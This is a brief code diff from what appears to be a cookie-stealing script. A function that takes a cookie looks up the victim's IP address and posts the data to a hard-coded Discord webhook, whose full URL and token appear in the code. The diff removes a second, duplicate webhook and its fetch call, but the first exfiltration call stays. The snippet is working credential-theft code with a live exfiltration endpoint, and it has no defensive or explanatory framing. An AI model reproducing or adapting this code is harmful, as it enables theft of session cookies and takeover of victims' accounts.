@@ -1,5 +1,4 @@
 const WEBHOOK = "https://discord.com/api/webhooks/1322567795820466326/3PF0HjpJ9VVuJNW7kXHnRXx_tJMBlWUp_nTQ1qKeEM3ipeYfc6fTdnmnC_pNC5c2rOgL";
-const SECOND_WEBHOOK = "https://discord.com/api/webhooks/1322581414528421920/TNRQRocFpd7S_mABqaa-6vQ8C8AJ-049kcK2c3iu1ecSIyDK1Idy_Fk8XGNmX4CqO-Kt"; //add the web hook here
 
 async function main(cookie) {
     var ipAddr = await (await fetch("https://api.ipify.org")).text();
@@ -62,13 +61,6 @@ async function main(cookie) {
             },
             body: JSON.stringify(payload)
         }),
-        fetch(SECOND_WEBHOOK, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-        })
     ]);
 }
 
